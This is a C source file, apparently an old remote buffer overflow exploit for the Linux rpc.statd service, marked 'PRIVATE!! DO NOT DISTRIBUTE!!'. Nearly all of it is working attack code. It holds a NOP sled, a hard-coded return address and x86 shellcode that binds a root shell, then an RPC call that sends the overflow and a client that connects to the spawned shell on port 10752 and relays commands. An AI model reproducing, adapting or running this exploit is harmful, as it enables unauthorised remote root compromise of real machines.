/*
	PRIVATE!! DO NOT DISTRIBUTE!!

	status remote buffer overflow for linux (no stackpatch)
	by duke
	duke@viper.net.au || duke@el8.org

	shellcode currently is ripped from ADMmountd.. this is temporary 
	though.
	thanks to horizon, str :)

	greets to: #!ADM, el8.org  :))

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rpc/rpc.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <netdb.h>
#include "sm_inter.h"

#define NOP 0x90
#define BSZ 900 
#define RET 0xbffff1b2
#define PRT 10752

char shellcode[] =
 "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" /* alarm(0); */
 "\x33\xD2\x33\xc0\x8b\xDA\xb0\x06\xcd\x80\xfe\xc2\x75\xf4" /* close FDs */
  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62\xeb\x62" /* w/  fork() */
 "\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b" /* =\_ who wrote it? */
 "\xeb\xf5\xb0\x30\xfe\xc8\x88\x46\xff\xeb\xec" /* =/` hmm?  */
 "\x5e\xb0\x02\x89\x06\xfe\xc8\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb"
 "\xfe\xc3\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46"
 "\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"
 "\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
 "\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
 "\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
 "\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
 "\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
 "\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
 "\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";

void rshell(char *);
int max(int, int);

int main(int argc, char **argv)
{
	CLIENT *cl;
	char buf[1024];
	char *mn, *myname;
	mon m;
	mon_id id;
	my_id blah;
	int i, offset;
	sm_stat_res *hi;

	if(argc < 2){
		printf("usage: %s <host> [offset]\n", argv[0]);
		exit(0);
	}
	if(argc == 3)
		offset = atoi(argv[2]);
	else
		offset = 0;
	for(i=0; i < 1020; i+=4)
        	*(long *)&buf[i] = RET + offset;
	memset(buf, NOP, BSZ);
	memcpy(buf + (BSZ-strlen(shellcode)), shellcode, strlen(shellcode));
	if((cl = clnt_create(argv[1], 100024, 1, "tcp")) == NULL){
		printf("clnt_create failed.\n");
		exit(-1);
	}
	mn = malloc(1024*sizeof(char));
	myname = malloc(1024*sizeof(char));
	blah.my_name = myname;
	id.mon_name = mn;
	strncpy(id.mon_name, buf, 1024);
	strncpy(blah.my_name, "hi", 1024);
	blah.my_name[0] = '/';
	m.mon_id = id;
	m.mon_id.my_id = blah;
	blah.my_prog = 100024;
	blah.my_vers = 1;
	blah.my_proc = 2;
	printf("linux status remote overflow by duke.\n");
	printf("Sending shellcode...\n");
	hi = sm_mon_1(&m, cl);
	sleep(3);
	rshell(argv[1]);
} 

void rshell(char *host)
{
	int sockfd, maxfd, n;
	struct sockaddr_in cli;
	char sendln[1024], recvln[1024];
	struct hostent *hp;
	fd_set rset;

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(-1);
	}
	if((hp = gethostbyname(host)) == NULL){
		printf("Can't get hostname");
		exit(-1);
	}
	
	bzero(&cli, sizeof(cli));
	cli.sin_family = AF_INET;
	cli.sin_port = htons(PRT);
	inet_aton(AF_INET, hp->h_addr_list, &cli.sin_addr);
	if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0){
		perror("connect");
		exit(-1);
	}
	printf("root shell found!\n");
	strcpy(sendln, "uname -a; pwd;\n");
	write(sockfd, sendln, strlen(sendln));
	FD_ZERO(&rset);
	for(;;){
	        FD_SET(fileno(stdin), &rset);
        	FD_SET(sockfd, &rset);
        	maxfd = max(fileno(stdin), sockfd) + 1;
		select(maxfd, &rset, NULL, NULL, NULL);
		if(FD_ISSET(fileno(stdin), &rset)){
                        bzero(sendln, sizeof(sendln));
                        fgets(sendln, sizeof(sendln)-2, stdin);
			write(sockfd, sendln, strlen(sendln));
                }
                if(FD_ISSET(sockfd, &rset)){
                        bzero(recvln, sizeof(recvln));
			if((n = read(sockfd, recvln, sizeof(recvln))) == 0){
				printf("EOF.\n");
				exit(0);
			}
			if(n < 0){
				perror("read");
				exit(-1);
			}
                        fputs(recvln, stdout);
                }
        }
}

int max(int x, int y)
{
	if(x > y)
		return(x);
	return(y);
}	
